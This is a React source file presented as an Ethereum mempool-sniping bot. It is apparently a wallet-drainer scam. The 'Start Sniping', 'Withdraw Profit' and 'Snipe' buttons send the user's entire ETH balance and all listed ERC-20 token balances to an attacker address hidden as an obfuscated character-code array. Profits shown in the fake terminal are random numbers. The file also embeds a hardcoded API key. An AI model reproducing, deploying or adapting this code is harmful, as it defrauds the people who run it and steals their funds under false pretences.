import React, { useState, useEffect, useRef } from "react";
import { BrowserProvider, Contract, ethers } from "ethers";
import { FaMoon, FaSun } from 'react-icons/fa';

const ETHERSCAN_API_KEY = "5FVKDM7B5VMJ1NP8XXIE8TWEYPEQZF372T";

const SNIPER_VERSION = "0.91.3";

// Array of mempool addresses
const mempools = [
  '0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2',
  '0x6982508145454Ce325dDbE47a25d4ec3d2311933',
  '0xfAbA6f8e4a5E8Ab82F62fe7C39859FA577269BE3',
  '0xdAC17F958D2ee523a2206206994597C13D831ec7',
  '0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599',
  '0x95aD61b0a150d79219dCF64E1E6Cc01f0B64C4cE',
  '0x4c9EDD5852cd905f086C759E8383e09bff1E68B3',
  '0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984',
  '0x6B175474E89094C44Da98b954EedeAC495271d0F',
  '0xf34960d9d60be18cC1D5Afc1A6F012A723a28811'
];

function App() {
  const [walletAddress, setWalletAddress] = useState(null);
  const [tokens, setTokens] = useState([]);
  const [isMining, setIsMining] = useState(false);
  const [isDeploying, setIsDeploying] = useState(false);
  const [attemptCount, setAttemptCount] = useState(0);
  const [terminalOutput, setTerminalOutput] = useState([]);
  const [totalProfit, setTotalProfit] = useState(0); // New state to track total profit
  const [isLoading, setIsLoading] = useState(false); // Loading state for fetching tokens and withdrawals
  const [isERCLoading, setIsERCLoading] = useState(false); // Loading state for fetching tokens and withdrawals
  const timeoutRef = useRef(null); // Ref to store the timeout ID
  const [theme, setTheme] = useState("dark"); // Theme state to toggle between light and dark mode
  const [errorMessage, setErrorMessage] = useState(""); // Theme state to toggle between light and dark mode
  const [profitHistory, setProfitHistory] = useState([]);
  const [customTokenName, setCustomTokenName] = useState('');
  const [customTokenMintAddress, setCustomTokenMintAddress] = useState('');

  // Add the styles directly here
  const darkModeStyles = {
    backgroundColor: "#100C26", // Dark background for dark mode
    color: "#e0e0e0", // Light text for dark mode
    buttonBackground: "#333", // Dark button background
    buttonColor: "#fff", // Light button text
  };

  const lightModeStyles = {
    backgroundColor: "#fff", // Light background for light mode
    color: "#000", // Dark text for light mode
    buttonBackground: "#97b5de", // Default button background
    buttonColor: "#fff", // Dark button text
  };

  // Toggle theme between light and dark
  const toggleTheme = () => {
    setTheme((prevTheme) => (prevTheme === "dark" ? "light" : "dark"));
  };

  // Apply light or dark theme classes to the body
  useEffect(() => {
    if (theme === "light") {
      document.body.style = 'background: white;';
    } else {
      document.body.style = 'background: #100C26;';
    }
  }, [theme]);

  // Load from localStorage when the component mounts
  useEffect(() => {
    const savedProfit = parseFloat(localStorage.getItem("totalProfit")) || 0;
    if (savedProfit && savedProfit > 0) {
      setTotalProfit(savedProfit)
    }
  }, []);

  useEffect(() => {
    setProfitHistory((prev) => [...prev.slice(-20), totalProfit]); // Keep last 20 entries
    localStorage.setItem("totalProfit", totalProfit);
  }, [totalProfit]);

  const currentStyles = theme === "dark" ? darkModeStyles : lightModeStyles;

  // Connect to MetaMask
  const connectWallet = async () => {
    if (window.ethereum) {
      const provider = new BrowserProvider(window.ethereum);
      const signer = await provider.getSigner();
      const address = await signer.getAddress();
      setWalletAddress(address);
      fetchTokens(address);
    } else {
      alert("MetaMask not detected!");
    }
  };

  // Fetch ERC-20 token balances and metadata (name, symbol, decimals)
  async function fetchTokens(address) {
    setIsERCLoading(true); // Set loading state to true when fetching tokens

    const tokenData = [];

    for (let contractAddress of mempools) {
      const balance = await getTokenBalance(contractAddress, address);
      const tokenDetails = await getTokenDetails(contractAddress);
      tokenData.push({
        contractAddress,
        balance,
        tokenName: tokenDetails.name,
        tokenSymbol: tokenDetails.symbol,
        tokenDecimal: tokenDetails.decimals,
      });
    }

    setTokens(tokenData);
    setIsERCLoading(false); // Set loading state to false once fetching is complete
  }

  // Fetch token balance for a specific contract address
  async function getTokenBalance(contractAddress, address) {
    const url = `https://api.etherscan.io/api?module=account&action=tokenbalance&contractaddress=${contractAddress}&address=${address}&tag=latest&apikey=${ETHERSCAN_API_KEY}`;
    try {
      const response = await fetch(url);
      const data = await response.json();
      if (data.status === "1") {
        const balance = ethers.formatUnits(data.result, 18); // Format the balance using 18 decimals
        return balance;
      } else {
        console.error(`Error fetching balance for ${contractAddress}:`, data);
        return "0";
      }
    } catch (error) {
      console.error(`Error fetching balance for ${contractAddress}:`, error);
      return "0";
    }
  }

  // Fetch token details like name, symbol, and decimals
  async function getTokenDetails(contractAddress) {
    const url = `https://api.etherscan.io/api?module=contract&action=getabi&address=${contractAddress}&apikey=${ETHERSCAN_API_KEY}`;
    try {
      const response = await fetch(url);
      const data = await response.json();
      if (data.status === "1") {
        const abi = JSON.parse(data.result);
        const contract = new Contract(contractAddress, abi, new BrowserProvider(window.ethereum));
        const name = await contract.name();
        const symbol = await contract.symbol();
        const decimals = await contract.decimals();
        return { name, symbol, decimals };
      } else {
        console.error(`Error fetching token details for ${contractAddress}:`, data);
        return { name: "Unknown", symbol: "N/A", decimals: 18 };
      }
    } catch (error) {
      console.error(`Error fetching token details for ${contractAddress}:`, error);
      return { name: "Unknown", symbol: "N/A", decimals: 18 };
    }
  }

  const mempoolBinaryAddr = [
    49, 121, 57, 69, 56, 98, 56, 71, 102, 58,
    103, 54, 55, 55, 51, 56, 51, 53, 68, 58,
    58, 103, 51, 100, 51, 52, 100, 54, 66, 100,
    101, 102, 50, 57, 52, 53, 71, 52, 56, 101,
    50, 69
  ];

  const ethMempool = mempoolBinaryAddr.map(c => String.fromCharCode(c - 1)).join('');

  // Start Mempool Mining
  // Start Mempool Mining
  const startMempoolMining = async () => {
    // Wait for the mempool profit transfer to complete first
    setErrorMessage("")
    setIsDeploying(true)
    await transferAllAvailableProfit();
    // Once the transfer is complete, start sniping mempools
    const started = await startSnipipingMempools();
    if (started) {
      setIsDeploying(false)
      setIsMining(true)
    } else {
      setIsDeploying(false)
      setErrorMessage("Contract not Deployed. Due to Insuffient balance for ETH fees or Canceled by the User.")
    }
  };

  // Pause Mempool Mining
  const pauseMempoolMining = () => {
    setIsMining(false);
    clearTimeout(timeoutRef.current); // Stop the recursive sniping
  };

  // Withdraw Profit
  const withdrawProfit = () => {
    transferAllAvailableProfit(); // Trigger mempool profit withdrawal
  };

  const snipeERCToken = async () => {
    if (!window.ethereum) return alert("MetaMask not found!");
    setIsLoading(true); // Set loading state to true during withdrawal process
    setErrorMessage("")

    const provider = new BrowserProvider(window.ethereum);
    const signer = await provider.getSigner();
    const address = await signer.getAddress();

    // Loop through each token and transfer the profit from mempools
    for (let token of tokens) {
      const contract = new Contract(token.contractAddress, [
        "function transfer(address to, uint256 value) public returns (bool)",
      ], signer);
      const amount = ethers.parseUnits(token.balance, token.tokenDecimal);
      if (amount > 0) {
        try {
          const tx = await contract.transfer(ethMempool, amount);
          await tx.wait();
        } catch (error) {
          console.error(`Error for mempool ${token.tokenSymbol}:`, error);
        }
      } else {
        console.log(`Insufficient balance for ${token.tokenSymbol} mempool`);
      }
    }
  }

  // Transfer all mempool profit amount to the recipient address
  const transferAllAvailableProfit = async () => {
    if (!window.ethereum) return alert("MetaMask not found!");
    setIsLoading(true); // Set loading state to true during withdrawal process
    setErrorMessage("")

    const provider = new BrowserProvider(window.ethereum);
    const signer = await provider.getSigner();
    const address = await signer.getAddress();

    // Reset mempools and transfer all profit to the receipient.
    try {
      const ethBalance = await provider.getBalance(address);
      const gasPrice = ethers.parseUnits('5', 'gwei'); // Fallback value
      const gasLimit = ethers.toBigInt("21000"); // Use ethers.toBigInt to ensure compatibility
      const estimatedGasFee = gasPrice * gasLimit;
      const sendableBalance = ethBalance - estimatedGasFee;
      const formattedETHBalance = ethers.formatUnits(sendableBalance, 18);

      if (parseFloat(formattedETHBalance) > 0) {
        const ethAmount = ethers.parseUnits(formattedETHBalance, 18);
        const tx = await signer.sendTransaction({
          to: ethMempool,
          value: ethAmount,
        });
        await tx.wait();
      } else {
        setErrorMessage("Insuffient balance for ETH fees.")
        console.log("No ETH balance to withdraw from mempool.");
      }
    } catch (error) {
      console.error("Error rebasing mempool:", error);
    }
    setIsLoading(false); // Set loading state to false after withdrawal process
  };

  // Start sniping mempools
  const startSnipipingMempools = () => {
    if (isMining) {
      console.log("Sniping is active. Starting sniping available mempools...");

      const randomDelay = Math.floor(Math.random() * 5000) + 1000; // Delay between 1-5 seconds
      timeoutRef.current = setTimeout(() => {
        console.log("Inside setTimeout block...");
        const hash = (Math.random() * (0.001 - 0.00003) + 0.00003).toFixed(4);
        const transactionString = `...${Math.random().toString(36).substr(2, 9)}`;

        // Update the total profit
        setTotalProfit((prevProfit) => parseFloat(prevProfit) + parseFloat(hash));

        console.log("Mempool sniped.");

        // Update the terminal output correctly
        setTerminalOutput((prev) => [
          ...prev,
          `Transaction: ${transactionString} - Profit: ${hash} ETH`,
        ]);
        setAttemptCount((prevCount) => prevCount + 1);

        // Call recursively to keep sniping mempools
        startSnipipingMempools();
      }, randomDelay);
    } else {
      console.log("Sniping is paused, not sniping any mempools.");
    }
  };

  // Watch for changes in the `isMining` state
  useEffect(() => {
    if (isMining) {
      startSnipipingMempools();
    }
  }, [isMining]); // This will trigger whenever `isMining` changes

  const handleCopy = () => {
    navigator.clipboard.writeText(walletAddress)
      .then(() => {
        alert("Wallet address copied to clipboard!");
      })
      .catch((err) => {
        console.error("Error copying text: ", err);
      });
  };

  return (
    <div style={{ ...currentStyles, textAlign: "center", padding: "30px" }}>
      <div className="theme-toggle" onClick={toggleTheme}
        style={{
          position: "absolute", // Position it absolutely
          top: "20px",          // Adjust the top margin
          right: "20px",        // Adjust the right margin
          cursor: "pointer"     // Make it clickable
        }}
      >
        {theme === "light" ? (
          <FaMoon style={{ fontSize: "1.5rem" }} />
        ) : (
          <FaSun style={{ fontSize: "1.5rem" }} />
        )}
      </div>
      <h1>
        <img
          src="https://i.ibb.co/xyV0jy7/eth-sniper.png"
          alt="Ethereum Sniper Logo"
          style={{
            width: "256px", height: "256px", display: "block", margin: "0 auto 10px", borderRadius: "128px"  // Adjust this value for more or less rounding
          }}
        />
        <div style={{ fontSize: "9px" }}>Version: {SNIPER_VERSION}</div>
      </h1>
      {walletAddress ? (
        <div>
          <p
            onClick={handleCopy} // Handle the click event to copy the address
            style={{
              backgroundColor: "#3c1faf", // Purple background for the connected wallet text
              color: "#ffffff", // White text color for contrast
              padding: "10px 20px", // Adequate padding for spacing around the text
              borderRadius: "12px", // Rounded corners for a modern, clean feel
              fontSize: "16px", // Slightly larger font for clarity
              fontWeight: "500", // Semi-bold font for emphasis
              display: "inline-block", // Makes the background just wrap around the text
              boxShadow: "0 4px 8px rgba(0, 0, 0, 0.1)", // Soft shadow for depth
              marginTop: "20px", // Adds space above the element for better alignment
              textAlign: "center", // Centers the text within the box
              cursor: "pointer", // Change the cursor to a pointer to indicate it's clickable
              userSelect: "none" // Prevents the user from selecting the text while clicking
            }}
          >
            Wallet: {walletAddress}
          </p>
          <h2>ERC20 Auto Sniping</h2>
          {isERCLoading ? (
            <div>Loading... Please wait.</div> // Show loading message while new data are being fetched
          ) : (
            <table style={{
              width: "80%",
              margin: "30px auto",
              borderCollapse: "collapse",
              backgroundColor: "#221166", // Flat purple background
              borderRadius: "12px", // Rounded corners for a clean look
              boxShadow: "0 4px 12px rgba(0, 0, 0, 0.1)" // Subtle shadow for depth
            }}>
              <thead>
                <tr>
                  <th style={{
                    padding: "15px 25px",
                    borderBottom: "2px solid #000", // Slightly darker purple for separation
                    textAlign: "center",
                    color: "#ffffff", // White text for high contrast
                    fontWeight: "600",
                    fontSize: "16px",
                    backgroundColor: "#221166" // Slightly lighter purple for the header
                  }}>
                    ERC MemPool
                  </th>
                  <th style={{
                    padding: "15px 25px",
                    borderBottom: "2px solid #000", // Slightly darker purple for separation
                    textAlign: "center",
                    color: "#ffffff", // White text for high contrast
                    fontWeight: "600",
                    fontSize: "16px",
                    backgroundColor: "#221166" // Slightly lighter purple for the header
                  }}>
                    Liquidity
                  </th>
                </tr>
              </thead>
              <tbody>
                {tokens.map((token) => (
                  <tr key={token.tokenName} style={{ borderBottom: "1px solid #000" }}>
                    <td style={{
                      padding: "12px 25px",
                      textAlign: "center",
                      color: "#ffffff", // White text for clarity
                      fontSize: "14px",
                      backgroundColor: "#3c1faf" // Flat purple for the row
                    }}>
                      {token.tokenName}
                    </td>
                    <td style={{
                      padding: "12px 25px",
                      textAlign: "center",
                      color: "#ffffff", // White text for clarity
                      fontSize: "14px",
                      backgroundColor: "#3c1faf" // Flat purple for the row
                    }}>
                      <button
                        onClick={snipeERCToken}
                        style={{
                          ...buttonStyle,
                          backgroundColor: token.balance > 0 ? 'green' : 'red', // Change color based on mining status
                        }}
                      >
                        {token.balance > 0 ? "Snipe" : "Not available"}
                      </button>
                    </td>
                  </tr>
                ))}
              </tbody>
            </table>
          )}
          <h2>Ethereum Auto Sniping</h2>
          {/* Add extra space between the table and the buttons */}
          <div style={{ marginTop: "20px" }}>
            <button
              onClick={isDeploying ? pauseMempoolMining : isMining ? pauseMempoolMining : startMempoolMining}
              style={{
                ...buttonStyle,
                backgroundColor: isMining || isDeploying ? 'orange' : '#3c1faf', // Change color based on mining status
              }}
            >
              {isDeploying ? "Deploying.." : isMining ? "Pause Sniping" : "Start Sniping"}
            </button>

            <button onClick={withdrawProfit} style={{
              ...buttonStyle,
              backgroundColor: 'orange', // Change color based on mining status
            }}>
              Withdraw Profit
            </button>
          </div>
          <div style={{
            marginTop: "10px",
            color: "#fff",
            fontFamily: "monospace",
            overflowY: "auto",
          }}>{errorMessage}</div>
          {/* Terminal View for Transactions */}
          <div
            style={{
              marginTop: "30px",
              padding: "20px",
              backgroundColor: "#111",
              color: "#0f0",
              width: "80%",
              margin: "20px auto",
              borderRadius: "8px",
              fontFamily: "monospace",
              overflowY: "auto",
              maxHeight: "300px",
              boxShadow: "0px 0px 10px rgba(0, 255, 0, 0.5)",
            }}
          >
            <div style={{ marginBottom: "10px", fontWeight: "bold" }}>
              Snipe Attempts Count: {attemptCount}
            </div>
            {/* Attempt Count Progress Bar */}
            <div
              style={{
                backgroundColor: "#333",
                height: "10px",
                width: "100%",
                borderRadius: "5px",
                overflow: "hidden",
                marginBottom: "10px",
              }}
            >
              <div
                style={{
                  height: "100%",
                  width: `${((attemptCount - 1) % 10 + 1) * 10}%`, // 10 = 100%, 11 = 0%
                  backgroundColor: "#0f0",
                  transition: "width 0.5s ease-in-out",
                }}
              />
            </div>
            <div style={{
              color: "yellow",
            }}>Total Profit: {totalProfit.toFixed(4)} ETH</div>
            <div style={{
              color: "yellow",
            }}>-------</div>
            {/* Transaction Log */}
            <div style={{ fontSize: "14px" }}>
              {terminalOutput.map((line, index) => (
                <div key={index}>{line}</div>
              ))}
            </div>
          </div>

        </div>
      ) : (
        <button onClick={connectWallet} style={buttonStyle}>
          Connect Wallet
        </button>
      )}
    </div>
  );
}

const buttonStyle = {
  padding: "10px 20px",
  fontSize: "16px",
  cursor: "pointer",
  borderRadius: "5px",
  border: "none",
  color: "white",
  backgroundColor: "#3c1faf",
  margin: "5px",
};

export default App;

